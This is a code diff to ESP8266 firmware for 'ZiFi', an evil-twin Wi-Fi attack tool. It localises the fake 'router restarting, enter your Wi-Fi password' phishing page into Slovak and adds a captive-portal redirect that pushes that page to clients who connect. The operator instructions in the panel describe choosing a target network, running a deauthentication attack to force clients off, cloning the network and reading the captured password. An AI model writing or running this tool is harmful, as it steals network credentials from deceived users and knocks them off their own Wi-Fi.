@@ -2,11 +2,11 @@
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
 
-#define SUBTITLE "Validation Panel"
-#define TITLE "Sign in:"
-#define BODY "Due to internal problems router is being restarted. Enter password to re-connect to the network."
-#define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 1 minute for device connection.</br>Thank you."
+#define SUBTITLE "OVEROVACÍ PANEL"
+#define TITLE "Prihlasovanie:"
+#define BODY "Nastali neočakávané problémy ! Router bude reštartovaný . Napíšte heslo od vašej wifi siete pre pripojenie k internetu."
+#define POST_TITLE "Prihlasovanie..."
+#define POST_BODY "Overovanie ... Prosím, počkajte na overenie. Môže to trvať až 1 minútu.</br>Ďakujeme za používanie našeho firmvéru. Za 30 sekúnd skontrolujte vaše internetové pripojenie na sieti."
 
 typedef struct
 {
@@ -39,6 +39,7 @@ String header(String t)
 {
   String a = String(_selectedNetwork.ssid);
   String CSS = R"=====(
+    <meta charset="UTF-8">
     <style>
       body {
         background: #1a1a1a;
@@ -62,13 +63,16 @@ String header(String t)
       }
       button {
         display: inline-block;
-        height: 38px;
-        padding: 0 20px;
-        color: #fff;
+        height: 60px;
+        padding: 0 30px;
+        
+
+        color: purple;
+        
         text-align: center;
-        font-size: 11px;
+        font-size: 20px;
         font-weight: 600;
-        line-height: 38px;
+        line-height: 50px;
         letter-spacing: .1rem;
         text-transform: uppercase;
         text-decoration: none;
@@ -94,7 +98,7 @@ String header(String t)
       }
     </style>
   )=====";
-  String h = "<!DOCTYPE html><html>"
+  String h = "<!DOCTYPE html><html lang=\"sk\">"
              "<head><title>" +
              a + " :: " + t + "</title>" +
              "<meta name=viewport content=\"width=device-width,initial-scale=1\">" +
@@ -114,9 +118,44 @@ String posted()
   return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>";
 }
 
+
+//  -----------------------------------------------  OLD 
+//void setup()
+//{
+//
+//  Serial.begin(115200);
+//  WiFi.mode(WIFI_AP_STA);
+//  wifi_promiscuous_enable(1);
+//  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), //IPAddress(255, 255, 255, 0));
+//  WiFi.softAP("ZiFi", "Eviltwin");
+//  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+//
+//  webServer.on("/", handleIndex);
+//  webServer.on("/result", handleResult);
+//  webServer.onNotFound(handleIndex);
+//  webServer.begin();
+//}
+//  -----------------------------------------------  OLD
+
+
+// ------------------------------------------------ NEW
+void handleNotFound() {
+  String host = webServer.hostHeader();
+  if (host.indexOf('.') == -1) {
+    // Doménové meno nie je prítomné, takže presmerujeme na Captive Portal
+    String redirectUrl = "http://" + webServer.client().localIP().toString();
+    webServer.sendHeader("Location", redirectUrl, true);
+    webServer.send(302, "text/plain", "");
+  } else {
+    // Doménové meno je prítomné, ignorujeme to
+    webServer.send(404, "text/plain", "File Not Found");
+  }
+}
+// ------------------------------------------------ NEW
+
+
 void setup()
 {
-
   Serial.begin(115200);
   WiFi.mode(WIFI_AP_STA);
   wifi_promiscuous_enable(1);
@@ -126,9 +165,25 @@ void setup()
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
-  webServer.onNotFound(handleIndex);
+  webServer.onNotFound(handleNotFound); // Táto funkcia sa volá, keď sa požiadavka nenašla
+
+  // Ak sa zariadenie pripojí k sieti, automaticky zobrazíme prihlasovaciu stránku
+  WiFi.onStationModeConnected(handleClientConnected);
+
   webServer.begin();
 }
+
+void handleClientConnected(const WiFiEventStationModeConnected &event)
+{
+  Serial.println("Client connected to Wi-Fi network");
+  // Automaticky zobrazíme prihlasovaciu stránku
+  handleIndex();
+}
+
+
+
+// ------------------------------------------------ NEW
+
 
 void performScan()
 {
@@ -232,18 +287,19 @@ void handleIndex()
   if (hotspot_active == false)
   {
     String _html = R"=====(
+      <meta charset="UTF-8">
       <div class='content'>
         <p>
           <h1 style="border: solid #20c20e 3px; padding: 0.2em 0.2em; text-align: center; font-size: 2.5rem;">ZiFi</h1>
           <span style="color: #F04747;">INFO: </span><br>
           <span>
-              - This tool will scan the network automatically for every 15 seconds. Or You can just refresh the page to scan again.<br>
-              - Please select only one target!<br>
-              - Next click on deauth attack, then after some time clients on that network will get starting disconnecting.<BR>
-              - Now perform Evil-Twin attack, which will create the clone of the selected network.<br>
+              - Toto zariadenie bide skenovať siete v okolí automaticky každých 15 sekúnd. (Alebo môžete REFRESHNÚŤ túto Web Stránku).<br>
+              - <strong style="color: #008000;">Prosím vyberte LEN JEDNU CIELOVÚ SIEŤ!</strong><br>
+              - Ďalej klikni na tlačidlo "deauth attack", Potom po nejakom čase sa NASILU ODPOJÍ pripojené zariadenia (klienti) na tej cieľovej wifi sieti.<BR>
+              - Teraz spustite "Evil-Twin attack", <strong style="color: #008000;">ktorý vytvorí KLON vybranej siete</strong>.<br>
               - The web interface will be unavailable during Evil-twin attack mode, You need to reconnect.<br>
-              - Reconnect after some time, it will display you the correct password in Result section.<br><br>
-              Special Credits: spacehuhntech, M1z23R, 125K
+              - POTOM SA PRIPOJ PO NEJAKOM ČASE !, zobrazí sa DOLE NA SPODU Web stránky správne heslo od vybranej siete v "Result section".<br><br>
+              SPECIAL CREDITS / VEĽKÁ VĎAKA: <strong style="color: #008000;">Dominik Hulin</strong>, Spacehuhn, M1z23R, 125K
           </span>
         </p><br><hr><br>
         <h1>Attack Mode</h1>
